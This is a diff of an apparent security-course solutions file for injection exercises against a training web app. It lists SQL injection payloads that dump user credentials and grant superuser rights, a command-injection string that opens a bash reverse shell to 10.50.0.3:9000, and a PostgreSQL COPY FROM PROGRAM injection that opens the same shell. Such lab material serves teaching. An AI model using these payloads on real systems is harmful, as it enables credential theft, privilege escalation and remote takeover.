@@ -1,8 +1,8 @@
-Solutions to injection exercises
-================================
+Queres and code for injection exercises
+=======================================
 
-Solution to Exercise "SQL Injection"
-------------------------------------
+SQL Injection queries
+---------------------
 
 Show users:
 xxx') union select id, username, password, 0.0 from auth_user --
@@ -14,6 +14,7 @@ Reset bob's permissions
 xxx'); update auth_user set is_staff=true, is_superuser=true where username = 'bob' --
 
 Fixed version of search()
+-------------------------
 
 @require_http_methods(["POST"])
 def search(request):
@@ -46,9 +47,16 @@ def search(request):
 
 -------------------------------------------------------------------------------
 
-Solution to Exercise "Command Injection"
-----------------------------------------
+Text for Command Injection
+--------------------------
 
 " && bash -c 'bash -i >& /dev/tcp/10.50.0.3/9000 0>&1' #
 
 
+Query for SQL reverse shell
+---------------------------
+
+xxx'); CREATE TABLE trigger_test ( tt_id serial PRIMARY KEY, command_output text); COPY trigger_test (command_output) FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.50.0.3/9000 0>&1 &'''; --
+
+(for this to work, your application will have to connect to the database as user postgres,
+not user coffeeshopowner)
